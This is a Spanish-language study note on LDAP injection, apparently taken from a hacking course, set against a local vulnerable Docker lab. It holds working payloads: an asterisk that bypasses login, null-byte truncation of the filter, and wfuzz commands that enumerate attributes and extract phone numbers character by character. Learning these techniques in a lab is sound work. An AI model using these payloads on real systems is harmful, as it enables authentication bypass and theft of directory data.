---
tags:
  - Web
  - Explotacion
  - LDAP-Injection
---


# Notas

https://www.profesionalreview.com/2019/01/05/ldap/

## Enumeración

**NMAP**

NMAP tiene muchos script para enumerar LDAP.
Podemos ejecutar un reconocimiento para que enumere con todos los script de LDAP de la siguiente manera:

```bash
sudo nmap --script ldap\* -p389 localhost
```


**IDAPSEARCH**

Para la enumeración podemos utilizar al herramienta **ldapserch:**

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

ESTA ES UN RECONOCIEMIENTO BÁSICO, SE PUEDEN IMPLEMENTAR CONDICIONALES COMO EL SIGUIENTE:

`Esto lo que hace es buscar con el usuario admin, usuarios con descripcion LDAP y lo que sigue`

```bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP*))'
```


**LDAPADD**

Esta herramienta nos permite añadir configuración LDAP mediante un archivo, por ejemplo agregar usuarios.

```bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldif
```

## Esplotación

LAS PÁGINAS VULNERABLES SUELEN TENER LO SIGUIENTE:

(&
	(cn=admin)
	(userPassword=contraseña)
)

### Uso de *

Si la sentencia no esta bien sanitizada, podemos ingresar en password el * para que quede de la siguiente manera:

```
(&
	(cn=admin)
	(userPassword=*)
)
```

Ahora si interceptamos la petición y vemos que por POST mandamos lo siguiente:

Esto da un estado 301 en la respuesta
```
user_id=admin&password=*&login=1&submit=Submit
```

Si en el usuario ponemos el asterisco despues de una letra, por ejemplo la a de admin nos va a seguir dando el codigo de estado 301.

En el caso de que le pongamos una b, que en este caso no hay ningún usuario que empiece por b, entonces nos data una código de estado 200.

**DICHO ESTO, PODEMOS CREAR UNA SCRIPT PARA SACAR USUARIOS**

### NULL byte

Si la petición es:

```
(&(cn=admin)(userPassword=*))
```

Lo que se podría hacer es lo siguiente:

```
(&(cn=admin))%00)(userPassword=*))
```

De esta manera solo interpretara `(&(cn=admin))`

**NOS PODEMOS CREAR UNA SCRIPT PARA ENUMERAR USUARIOS**

Por ejemplo podemos hacer fuerza bruta buscando parámetros:

```
(&(cn=admin)(FUZZ=*))%00)(userPassword=*))
```

Buscar parámetros:
```shell
wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=bendu)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888
```

Buscar valores de un parámetro

```shell
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=bendu)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
```

**ESTO CONSISTE EN IR  SACANDO CARACTER POR CARACTER EL NÚMERO**


# Hack4u

Las inyecciones **LDAP** (**Protocolo de Directorio Ligero**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.

La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

- Acceder a información de usuarios o recursos que no debería tener acceso.
- Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
- Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.

Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.

A continuación, se proporciona el enlace directo al proyecto de Github que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:

- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

# Laboratorios

A continuación, se proporciona el enlace directo al proyecto de Github que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:

- **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)


**NOTA (Actualización 24/04/2023)**: A la hora de clonar el proyecto y hacer un ‘**docker build -t ldap-client-container .**‘, es probable que tras ejecutar la instrucción ‘**apt-get update**‘, os salga un error que os impide construir la imagen correctamente.

Para evitar este problema, tan solo es necesario cambiar en el archivo ‘**Dockerfile**‘ la primera línea de ‘**FROM php:7.0-apache**‘ a ‘**FROM php:8.0-apache**‘. De esta forma, ya no tendréis problemas y el laboratorio se podrá desplegar correctamente:

  
![[Pasted image 20250418200646.png]]


```
dn: uid=bendu,dc=example,dc=org
uid: bendu
cn: bendu
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/bendu
uidNumber: 14583102
gidNumber: 14564100
userPassword: bendu123
mail: bendu@bendu.com
description: Prueba bendu
telephoneNumber: 634928344
```